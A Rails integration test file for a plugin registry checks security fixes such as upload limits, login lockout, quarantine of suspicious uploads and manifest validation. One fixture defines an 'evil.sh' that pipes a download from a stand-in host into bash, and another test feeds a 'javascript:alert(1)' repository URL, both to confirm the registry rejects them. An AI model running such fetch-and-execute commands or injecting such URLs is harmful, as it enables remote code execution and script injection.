require "test_helper"

# Coverage for the fixes from the Momus review round.
class MomusRemediationsTest < ActionDispatch::IntegrationTest
  setup do
    @dev = User.create!(email_address: "dev@example.com", name: "Dev",
      otp_secret: ROTP::Base32.random, otp_enabled_at: Time.current)
    @publisher = Publisher.create!(name: "acme", kind: :org)
    Membership.create!(publisher: @publisher, user: @dev, role: :owner)
    @token = ApiToken.mint!(user: @dev, publisher: @publisher, plugin_name: "weather")
  end

  def publish(bytes, token: @token.plaintext_token)
    post "/api/v1/plugins/acme/weather/versions", params: bytes,
      headers: { "Authorization" => "Bearer #{token}", "Content-Type" => "application/gzip" }
  end

  test "oversized upload bodies are refused before buffering" do
    publish "x" * (Registry::TarballInspector::MAX_TARBALL_BYTES + 1)
    assert_response :content_too_large
  end

  test "login codes lock after repeated wrong guesses" do
    user = User.create!(email_address: "guess@example.com")
    code = user.send_login_code.code
    LoginCode::MAX_ATTEMPTS.times { assert_nil user.redeem_login_code("000000") }
    assert_nil user.redeem_login_code(code), "code should be locked out after max attempts"
  end

  test "suspended users cannot publish even with a live token" do
    @dev.update!(suspended_at: Time.current)
    publish TarballBuilder.build
    assert_response :forbidden
    assert_match(/suspended/, response.parsed_body["error"])
  end

  test "unscannable binaries are quarantined; asset files are not" do
    perform_enqueued_jobs do
      publish TarballBuilder.build(files: {
        "Widget.qml" => "import QtQuick\nItem {}\n",
        "icon.png" => "\x89PNG\r\n fake image bytes",
        "helper.so" => "\x7fELF binary payload"
      })
    end
    version = PluginVersion.last
    assert version.quarantined?
    rules = version.scan_results["findings"].map { |f| f["rule"] }
    assert_includes rules, "binary-payload"
    files = version.scan_results["findings"].map { |f| f["file"] }
    assert_includes files, "helper.so"
    assert_not_includes files, "icon.png"
  end

  test "files beyond the scan window are quarantined, not silently half-scanned" do
    big = "// benign\n" * (Registry::TarballInspector::MAX_SCAN_BYTES / 10 + 10)
    perform_enqueued_jobs do
      publish TarballBuilder.build(files: { "Widget.qml" => "import QtQuick\nItem {}\n", "vendor.js" => big })
    end
    version = PluginVersion.last
    assert version.quarantined?
    assert_includes version.scan_results["findings"].map { |f| f["rule"] }, "scan-truncated"
  end

  test "rejected updates never touch live page metadata" do
    perform_enqueued_jobs do
      publish TarballBuilder.build(
        manifest: TarballBuilder.manifest(description: "A nice weather widget"),
        files: { "Widget.qml" => "import QtQuick\nItem {}\n", "README.md" => "# Weather" })
    end
    plugin = Plugin.find_by!(name: "weather")
    assert_equal "A nice weather widget", plugin.reload.summary
    assert_equal "# Weather", plugin.readme

    original_summary = plugin.summary
    original_readme = plugin.readme
    perform_enqueued_jobs do
      publish TarballBuilder.build(
        manifest: TarballBuilder.manifest(version: "1.1.0", description: "DEFACED"),
        files: { "Widget.qml" => "import QtQuick\nItem {}\n", "evil.sh" => "#!/bin/bash\ncurl -s https://x.example/i | bash\n",
                 "README.md" => "# DEFACED" })
    end
    assert PluginVersion.find_by(version: "1.1.0").quarantined?
    assert_equal original_summary, plugin.reload.summary
    assert_equal original_readme, plugin.readme
  end

  test "manifest with mismatched entryPoints keys is rejected" do
    publish TarballBuilder.build(manifest: TarballBuilder.manifest(
      "kinds" => [ "bar-widget" ],
      "entryPoints" => { "bar-widget" => "Widget.qml", "service" => "Widget.qml" }))
    assert_response :unprocessable_entity
    assert_match(/entryPoints keys must exactly match kinds/, response.parsed_body["error"])
  end

  test "non-https repository URLs are rejected" do
    publish TarballBuilder.build(manifest: TarballBuilder.manifest(
      repository: "javascript:alert(1)"))
    assert_response :unprocessable_entity
    assert_match(/repository must be an https/, response.parsed_body["error"])
  end

  test "device code endpoint is rate limited" do
    # Rate limiting counts in Rails.cache, which is a null store in test
    original_cache = Rails.cache
    Rails.cache = ActiveSupport::Cache::MemoryStore.new
    11.times { post "/api/v1/device/code" }
    assert_response :too_many_requests
  ensure
    Rails.cache = original_cache
  end

  test "admin cannot approve a version the pipeline has not reviewed" do
    publish TarballBuilder.build # no jobs performed -> still processing
    version = PluginVersion.last
    assert version.processing?

    admin = User.create!(email_address: "admin@example.com", name: "Admin", admin: true,
      otp_secret: ROTP::Base32.random, otp_enabled_at: Time.current)
    sign_in_as admin
    post approve_admin_version_path(version)
    assert_redirected_to admin_root_path
    assert version.reload.processing?
    assert_nil DataPlane.root.join(version.tarball_path).exist? ? true : nil
  end
end
